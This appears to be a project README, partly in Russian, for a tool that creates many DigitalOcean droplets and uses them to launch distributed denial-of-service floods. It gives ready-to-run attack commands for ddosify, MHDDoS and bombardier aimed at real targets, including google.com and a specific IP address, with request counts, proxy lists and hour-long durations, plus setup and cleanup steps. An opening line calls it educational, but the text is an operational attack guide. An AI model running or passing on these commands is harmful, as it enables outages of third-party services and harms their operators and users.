For educational purposes only.

## Usage

````
npm run create -- -c 16
````
Creates 16 new droplets in Digital Ocean, installs ddosify. See `constants.js`. Edit `constants.js` to change `CPU` & `REGION`.

````
npm run attack -- "ddosify -t 'https://google.com' -n $((10000 * 333)) -d 10000 -T 999 -m GET"
````

````
npm run attack -- "python3 MHDDoS/start.py CFB 95.167.23.6:80 5 1000 socks5.txt 1000 3600 debug=true"
````

````
npm run attack -- "bombardier -c 6000 -d 1800s -m POST -H 'Content-Type: application/x-www-form-urlencoded' -l https://google.com"
````

````
npm run cleanup
````

Destroys all droplets. Do this before going to sleep. Save money.

## Installation

1. Install Node.js

2. Download code from GitHub

3. Run
```` 
  npm install
````

4. Create an empty file with name `.env` in the root folder.

6. Register at DigitalOcean, create one server (droplet) manually, use ssh key access.

Droplet to choose: (will handle ±1000 requests per seconds via ddosify)
* Ubuntu
* Basic
* 12$/month
* Authentication - SSH key

Как создать новый SSH key (DO_API_SSH_KEY_ID):
  * (PS в появившимся окне справа инструкция. если кратко - то запустить консоль cmd и команду ssh-keygen)
  * из сформированного файла .pub скопировать содерждимое в поле SSH key content
  * указать имя, например f1

Для того чтобы SSH_ID впилить в солюшин - нужно в браузере нажать правой кнопке на подключенном SSH digitalocean и из лейбла взять часть которая состоит из цифр
(Например <label for="sshKey_33402836">d3</label>, SSH_ID = 33402836)

7. Generate DO_API_KEY via https://cloud.digitalocean.com/account/api/tokens

8. Edit `.env`

````
DO_API_KEY=<INSERT DIGITAL OCEAN API KEY>
DO_API_SSH_KEY_ID=<INSERT DIGITAL OCEAN SSH KEY ID>
````

You're done.


# Known issues

- `npm run attack` will fail if the `npm run create` is in progress.

- Error:
````
FATAL: 1.1.1.1
Error: Timed out while waiting for handshake
````
Quick solution: destroy server with this IP on Digital Ocean.

